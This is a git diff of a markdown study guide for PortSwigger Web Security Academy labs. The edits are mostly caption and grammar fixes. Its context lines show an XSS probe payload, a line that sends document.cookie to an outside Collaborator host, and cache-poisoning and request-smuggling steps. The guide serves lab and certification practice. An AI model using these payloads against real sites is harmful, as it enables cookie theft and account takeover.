@@ -249,6 +249,7 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 ![AddEventListener Ads Message](images/AddEventListener-Ads-Message.png)  
 
 [PortSwigger Lab: DOM XSS using web messages](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages)  
+
 ### DOM Cookie Stealer  
 
 >In the **Search** function a Reflected XSS vulnerability is ***identified*** using ```\"-alert(1)}//``` payload. The attacker then deliver an exploit phishing link to the victim with a cookie stealing payload inside a hosted **iframe** on their exploit server.  
@@ -261,7 +262,7 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 
 >Image show the request using search function to send the document.cookie value in base64 to collaboration server.  
 
-![Reflected dom-xss json cookie stealer](images/reflected-dom-xss-json-cookie-stealer.png)  
+![Reflected DOM-XSS json cookie stealer](images/reflected-dom-xss-json-cookie-stealer.png)  
 
 [PortSwigger Lab: Reflected DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected)  
   
@@ -279,6 +280,7 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 [XSS Template Literal](#xss-template-literal)  
 [XSS WAF Bypass](#xss-waf-bypass)  
 [Stored XSS](#stored-xss)  
+[XSS in SVG Upload](#xss-svg-upload)  
   
 ### XSS Resources  
 
@@ -689,7 +691,7 @@ document.location='https://Collaborator.com/?CacheCookies='+document.cookie;
 
 >Identify that cache hit headers in responses, then test if the target support ```X-Forwarded-Host``` or ```X-Forwarded-Scheme``` headers. These headers can allow for the stealing of victim session cookie.  
   
->Identify if the adding the two **Forwarded** headers to the GET ```/resources/js/tracking.js``` request change the location response header, ***identify*** poisoning the cache with multiple headers positive.  
+>Identify if adding the two **Forwarded** headers to the GET ```/resources/js/tracking.js``` request, result in a change to the location response header. This ***identify*** positive poisoning of the cache with multiple headers.  
 
 ```html
 GET /resources/js/tracking.js?cb=123 HTTP/2
@@ -936,7 +938,7 @@ x=1
   
 ```  
 
-![gpost Obfuscating the TE header](images/gpost.png)  
+![GPost Obfuscating the TE header](images/gpost.png)  
 
 >**Note:** You need to include the trailing sequence **\r\n\r\n** following the final **0**.  
 
